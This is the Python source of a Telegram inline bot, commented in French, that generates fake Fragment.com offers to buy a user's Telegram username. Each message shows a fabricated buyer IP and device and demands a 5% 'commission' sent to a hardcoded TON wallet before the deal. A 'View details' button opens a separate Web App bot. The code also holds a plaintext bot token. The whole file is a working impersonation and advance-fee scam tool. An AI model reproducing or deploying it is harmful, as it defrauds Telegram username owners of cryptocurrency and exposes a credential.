import os
import time
import urllib.request
import json
import asyncio
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, WebAppInfo
from telegram.ext import Application, InlineQueryHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"

print(f"🤖 Inline Fragment Deal Generator v4.6")
print(f"🔑 Token: ✅")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")

# Variables globales
app = None
event_loop = None

def get_ton_price():
    """Récupère le prix du TON en temps réel"""
    try:
        # API CoinGecko plus fiable
        url = "https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd"
        with urllib.request.urlopen(url, timeout=10) as response:
            data = json.loads(response.read().decode())
            price = float(data['the-open-network']['usd'])
            print(f"💰 Prix TON récupéré: ${price:.4f}")
            return price
    except Exception as e:
        print(f"❌ Erreur API CoinGecko: {e}")
        # Fallback vers DIA API
        try:
            url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
            with urllib.request.urlopen(url, timeout=5) as response:
                data = json.loads(response.read().decode())
                price = float(data.get('Price', 5.50))
                print(f"💰 Prix TON (fallback): ${price:.4f}")
                return price
        except Exception as e2:
            print(f"❌ Erreur API DIA: {e2}")
            # Prix par défaut si toutes les APIs échouent
            return 5.50

def generate_fragment_message(username, ton_amount):
    """Génère le message Fragment avec formatage identique au bot original"""
    
    # Prix TON actuel - récupération en temps réel
    ton_price = get_ton_price()
    
    # Calculs
    price = float(ton_amount)
    price_usd = price * ton_price
    commission = price * 0.05
    commission_usd = commission * ton_price
    
    # Adresse wallet
    wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
    
    # Message Fragment - IDENTIQUE au bot original
    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: {wallet_address}

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""
    
    # Création des entités pour le formatage
    entities = []
    
    # 1. Offer Amount en gras
    offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
    offer_start = fragment_message.find(offer_text)
    if offer_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=offer_start,
            length=len(offer_text)
        ))
    
    # 2. Commission en gras
    commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
    commission_start = fragment_message.find(commission_text)
    if commission_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=commission_start,
            length=len(commission_text)
        ))
    
    # 3. Premier point Important en gras
    important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
    important_start1 = fragment_message.find(important_text1)
    if important_start1 != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=important_start1,
            length=len(important_text1)
        ))
    
    # 4. Deuxième point Important en gras
    important_text2 = "• If you choose not to proceed, simply ignore this message."
    important_start2 = fragment_message.find(important_text2)
    if important_start2 != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=important_start2,
            length=len(important_text2)
        ))
    
    # 5. Wallet cliquable - LONGUEUR CORRECTE (48 caractères: UQ...PR)
    wallet_start = fragment_message.find(wallet_address)
    if wallet_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.TEXT_LINK,
            offset=wallet_start,
            length=48,  # Longueur exacte de UQ...PR (48 caractères)
            url=f"https://tonviewer.com/{wallet_address}"
        ))
        print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
    
    # URL du bouton - identique au bot original
    button_url = f"https://t.me/BidRequestApp_bot/?startapp={username.lower()}-{price:g}"
    
    # Bouton utilisant Web App au lieu d'URL classique
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("View details", web_app=WebAppInfo(url=button_url))]])
    
    return fragment_message, entities, keyboard

async def inline_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère les requêtes inline du bot"""
    try:
        query = update.inline_query.query.strip()
        print(f"🔍 Requête inline reçue: '{query}'")
        
        # Validation de base
        if not query:
            await update.inline_query.answer([])
            return
        
        # Parser la requête "username montant"
        parts = query.split()
        if len(parts) < 2:
            await update.inline_query.answer([])
            return
        
        username = parts[0].replace('@', '')
        
        # Validation du username
        if not username.replace('_', '').isalnum() or len(username) < 3 or len(username) > 32:
            await update.inline_query.answer([])
            return
        
        # Parser le montant
        try:
            ton_amount = float(parts[1])
            if ton_amount <= 0 or ton_amount > 1000000:
                await update.inline_query.answer([])
                return
        except ValueError:
            await update.inline_query.answer([])
            return
        
        print(f"✅ Paramètres validés: {username}, {ton_amount} TON")
        
        # Générer le message Fragment
        message, entities, keyboard = generate_fragment_message(username, ton_amount)
        
        # Créer le résultat inline
        from telegram import InlineQueryResultArticle, InputTextMessageContent
        
        result = InlineQueryResultArticle(
            id=f"fragment_{username}_{ton_amount}_{int(time.time())}",
            title=f"Fragment Deal - @{username}",
            description=f"Generate deal for 💎{ton_amount:g} TON",
            thumbnail_url="https://i.imgur.com/fragment-icon.png",
            input_message_content=InputTextMessageContent(
                message_text=message,
                entities=entities
            ),
            reply_markup=keyboard
        )
        
        # Envoyer le résultat
        await update.inline_query.answer([result], cache_time=1)
        print(f"📤 Résultat inline envoyé pour {username}")
        
    except Exception as e:
        print(f"❌ Erreur inline_handler: {e}")
        await update.inline_query.answer([])

class WebhookHandler(BaseHTTPRequestHandler):
    """Gestionnaire HTTP pour les webhooks Telegram"""
    
    def do_POST(self):
        """Traite les requêtes POST du webhook"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            # Décoder et traiter l'update
            update_data = json.loads(post_data.decode('utf-8'))
            
            # Créer l'objet Update
            update = Update.de_json(update_data, app.bot)
            
            # Traitement asynchrone de l'update
            if event_loop and not event_loop.is_closed():
                asyncio.run_coroutine_threadsafe(
                    app.process_update(update), 
                    event_loop
                )
            
            # Réponse HTTP 200
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"ok": true}')
            
        except Exception as e:
            print(f"❌ Erreur webhook: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        """Traite les requêtes GET (health check)"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'Bot is running!')
    
    def log_message(self, format, *args):
        """Supprime les logs HTTP par défaut"""
        pass

def start_webhook_server():
    """Démarre le serveur webhook HTTP"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
        print(f"🌐 Serveur webhook démarré sur le port {PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"❌ Erreur serveur webhook: {e}")

async def setup_bot():
    """Configure et démarre le bot avec webhook"""
    global app, event_loop
    
    try:
        # Créer l'application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajouter le gestionnaire inline
        app.add_handler(InlineQueryHandler(inline_handler))
        
        # Initialiser le bot
        await app.initialize()
        
        # Configuration du webhook
        webhook_url = f"{WEBHOOK_URL}/webhook"
        await app.bot.set_webhook(
            url=webhook_url,
            allowed_updates=["inline_query"]
        )
        
        print(f"✅ Webhook configuré: {webhook_url}")
        print(f"🎯 Bot prêt pour les requêtes inline")
        
        # Garder la référence de l'event loop
        event_loop = asyncio.get_event_loop()
        
        # Démarrer le serveur webhook dans un thread
        webhook_thread = threading.Thread(target=start_webhook_server, daemon=True)
        webhook_thread.start()
        
        # Maintenir le bot vivant
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"❌ Erreur setup_bot: {e}")
        raise

def main():
    """Fonction principale"""
    try:
        print("🚀 Démarrage du bot inline...")
        
        # Démarrage asynchrone
        asyncio.run(setup_bot())
        
    except KeyboardInterrupt:
        print("🛑 Arrêt du bot...")
    except Exception as e:
        print(f"❌ Erreur critique: {e}")

if __name__ == '__main__':
    main()
